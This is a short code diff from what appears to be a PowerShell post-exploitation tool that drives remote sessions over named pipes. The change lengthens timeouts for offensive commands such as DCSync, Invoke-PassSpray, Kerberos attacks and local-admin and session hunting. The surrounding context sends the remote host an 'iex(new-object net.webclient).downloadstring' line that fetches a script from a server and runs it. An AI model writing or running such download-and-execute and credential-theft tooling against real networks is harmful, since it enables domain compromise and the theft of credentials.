@@ -1438,6 +1438,11 @@ function InteractWithPipeSession{
 			"Startup", "TLS", "Process"
 		)
 
+  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*"){
+			$global:RestoreTimeout = $True
+			$timeoutSeconds = 300
+		}
+
 		if ($allowedCommands -contains $command) {
 			$predefinedCommands = Get-Command -Command $command
 			
@@ -2047,10 +2052,6 @@ function InteractWithPipeSession{
 			
 			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1')")
 			$sw.Flush()
-			
-			$global:RestoreTimeout = $True
-			
-			$timeoutSeconds = 300
 		}
 		
 		elseif ($command -eq 'History') {
